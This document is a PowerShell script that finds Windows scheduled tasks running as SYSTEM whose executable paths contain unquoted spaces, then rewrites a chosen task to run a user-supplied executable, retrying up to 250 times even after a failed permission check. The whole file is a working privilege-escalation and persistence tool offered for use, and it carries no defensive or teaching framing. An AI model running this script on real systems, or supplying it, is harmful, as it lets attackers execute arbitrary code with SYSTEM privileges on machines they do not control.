# Scheduled Task Manipulator Script

# Function to display the list of scheduled tasks neatly
function Show-TaskList {
    param($taskList)
    Write-Host "`n[+] Available Scheduled Tasks with unquoted spaces:" -ForegroundColor Cyan
    $taskList | ForEach-Object -Begin { $i = 1 } -Process {
        Write-Host -NoNewline "[${i}] $($_.TaskName) " -ForegroundColor Yellow
        Write-Host -NoNewline "-> " -ForegroundColor Gray
        Write-Host "$($_.Path)" -ForegroundColor Green
        Write-Host ""   # single blank line
        $i++
    }
}

# Main Logic
Write-Host "[+] Starting Scheduled Task Modifier..." -ForegroundColor Cyan
Write-Host ""   # spacing

# Gather tasks running as SYSTEM with unquoted spaces in Execute path
$taskList = Get-ScheduledTask | Where-Object {
    ($_.Principal.UserId -eq 'SYSTEM' -or $_.Principal.UserId -eq 'NT AUTHORITY\\SYSTEM')
} | ForEach-Object {
    foreach ($act in $_.Actions) {
        if ($act.Execute -match '\s' -and $act.Execute -notmatch '^"') {
            [PSCustomObject]@{
                TaskName = $_.TaskName
                Path     = $act.Execute
                UserId   = $_.Principal.UserId
            }
        }
    }
}

# Check if any tasks found
if ($taskList.Count -eq 0) {
    Write-Host "[-] No manipulable scheduled tasks found!" -ForegroundColor Yellow
    return
}

# Display the task list
Show-TaskList $taskList

# Prompt user to select a task
while ($true) {
    Write-Host ""   # spacing
    $selection = Read-Host "Enter the task number you want to modify"
    if ([int]::TryParse($selection, [ref]$null) -and $selection -ge 1 -and $selection -le $taskList.Count) {
        break
    } else {
        Write-Host "[!] Invalid selection. Try again." -ForegroundColor Red
    }
}

$chosen = $taskList[$selection - 1]

# Ask for new path
while ($true) {
    Write-Host ""   # spacing
    $newPath = Read-Host "Enter the new executable path for '$($chosen.TaskName)'"
    if ([string]::IsNullOrWhiteSpace($newPath)) {
        Write-Host "[!] Path cannot be empty. Try again." -ForegroundColor Red
    } else {
        break
    }
}

# Prepare modification actions
$originalTask = Get-ScheduledTask -TaskName $chosen.TaskName -ErrorAction Stop
$actions = $originalTask.Actions | ForEach-Object {
    $a = $_.Clone()
    $a.Execute = $newPath
    $a
}

# Check permission to modify the task
Write-Host "`nChecking modify permissions for '$($chosen.TaskName)'..." -ForegroundColor Cyan
$canModify = $true
try {
    Set-ScheduledTask -TaskName $chosen.TaskName -Action $actions -WhatIf -ErrorAction Stop
} catch {
    $canModify = $false
}

if (-not $canModify) {
    $resp = Read-Host "No modify permission for task. Attempt anyway? (Y/n)"
    if ($resp -match '^[Nn]') {
        Write-Host "Aborting operation due to insufficient permissions." -ForegroundColor Red
        return
    }
}

# Attempt to change the task action path with retries
Write-Host "`nChanging path for task '$($chosen.TaskName)'..." -ForegroundColor Cyan
$success = $false
for ($i = 1; $i -le 250; $i++) {
    try {
        Set-ScheduledTask -TaskName $chosen.TaskName -Action $actions -ErrorAction Stop
        Write-Host "[Success!] Path changed to '$newPath'" -ForegroundColor Green
        $success = $true
        break
    } catch {
        Write-Host "[Denied] Attempt $i" -ForegroundColor DarkRed
    }
}

if (-not $success) {
    Write-Host "`n[!] Failed to update after multiple attempts." -ForegroundColor Red
    Write-Host "Please verify permissions or provide a different path." -ForegroundColor Yellow
    $retry = Read-Host "Try a different location/path/directory/selection? (Y/n)"
    if ($retry -match '^[Yy]') {
        & $PSCommandPath
    }
} else {
    Write-Host "`n[+] Task modification complete!" -ForegroundColor Cyan
}

Write-Host "`n[!] Script finished." -ForegroundColor Cyan
